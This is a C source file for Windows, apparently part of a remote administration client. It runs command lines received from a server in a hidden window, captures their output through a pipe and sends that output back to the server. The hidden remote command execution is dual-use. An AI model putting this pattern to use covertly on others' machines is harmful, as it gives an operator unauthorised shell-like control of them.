#undef UNICODE
#include <string.h>
#include <stdlib.h>
#include <windows.h>
#include <stdio.h>
#include "socket.h"
#include "model.h"

#define OUTPUT_BUFFER_SIZE 1024

BOOL  bRunning=FALSE;
HANDLE hRunCmdThread=INVALID_HANDLE_VALUE;
DWORD WINAPI RunCmdLineThread(LPVOID szCommandLine)
{
	char *szCmdOutput;
	char *szCmdInput = szCommandLine;
	int resultBufferSize;
	do
	{
		SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
		HANDLE hRead, hWrite;
		STARTUPINFO si = { .cb = sizeof(STARTUPINFO) };
		if (!CreatePipe(&hRead, &hWrite, &sa, 0))
		{
			char err[]="管道创建失败";
			szCmdOutput=malloc(sizeof(err));
			strcpy(szCmdOutput,err);
			break;

		}

		GetStartupInfo(&si);
		si.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		si.wShowWindow = SW_HIDE;
		si.hStdError = hWrite;
		si.hStdOutput = hWrite;


		PROCESS_INFORMATION pi;
		if(!CreateProcessA(NULL,szCmdInput, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi))
		{
			unsigned long int e = GetLastError();
			szCmdOutput = malloc(512);
			//switch(e)
			//{
				//case ERROR_FILE_NOT_FOUND: {
					char err_msg[256];
					char szCommand[MAX_PATH];
					int i, j;
					//for(i=0;szCmdInput[i]!='\0' && szCmdInput[i]==' ';i++);
					for(i=0; szCmdInput[i]==' '; i++);
					for(j=0; szCmdInput[i]!=' ' && szCmdInput[i]!='\0' && i < MAX_PATH; i++,j++) {
						szCommand[j] = szCmdInput[i];
					}
					if(!j) {
						*szCmdOutput = 0;
						resultBufferSize = 0;
						break;
					}
						
					szCommand[j]='\0';
					if(!FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, e, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), err_msg, 256, NULL)) {
						strcpy(err_msg, "unknown error");
					}
					sprintf(szCmdOutput, "%s: %s", szCommand, err_msg);
					//sprintf(szCmdOutput,"'%s' 无该命令.",szCmd);
					//break;
/*
				}
				default: {
					strcpy(szCmdOutput,"执行失败，未定义错误");
					break;
				}
			}*/
			resultBufferSize=strlen(szCmdOutput);
			break;
		}
		DWORD exitCode;
		GetExitCodeProcess(pi.hProcess,&exitCode);

		CloseHandle(hWrite);
		//if(pszRet==NULL) return exitCode;
		char buff[OUTPUT_BUFFER_SIZE + 1];
		int buffSize=0;
		char *szBuffer=malloc(1);

		DWORD dwRead = 0;
/*
		do {
			if(!ReadFile(hRead, buff, OUTPUT_BUFFER_SIZE, &dwRead, NULL)) break;
			szBuffer=realloc(szBuffer,buffSize+dwRead+1);
			memcpy(szBuffer+buffSize,buff,dwRead);
			buffSize+=dwRead;
			puts(szBuffer);
		} while(dwRead == OUTPUT_BUFFER_SIZE);
*/
		while(ReadFile(hRead, buff, OUTPUT_BUFFER_SIZE, &dwRead, NULL)) {
			szBuffer=realloc(szBuffer,buffSize+dwRead+1);
			memcpy(szBuffer+buffSize,buff,dwRead);
			buffSize+=dwRead;
		}
		szBuffer[buffSize]=0;
		resultBufferSize=buffSize;
		CloseHandle(hRead);
		szCmdOutput=szBuffer;
	}while(0);


	sendToServer(ToServer_CmdLineFeedBack,(unsigned char*) szCmdOutput);
	free(szCmdOutput);
	free(szCommandLine);
	bRunning=FALSE;
	//return exitCode;
	return 0;
}

int executeCommandLine(const char * szCommandLine)
{
	char *szCmdLine;
	//szCmdLine=malloc(strlen(szCommandLine)+1);
	//strcpy(szCmdLine,szCommandLine);
	szCmdLine = strdup(szCommandLine);
	DWORD threadId;

	hRunCmdThread=CreateThread(NULL, 0, (unsigned long int (__stdcall *)(void *))RunCmdLineThread, szCmdLine, 0, &threadId);
	if(hRunCmdThread==INVALID_HANDLE_VALUE)
		return 1;
	bRunning=TRUE;
	return 0;
}

void terminateCommandLine()
{
	TerminateThread(hRunCmdThread,0);
	bRunning=FALSE;
}
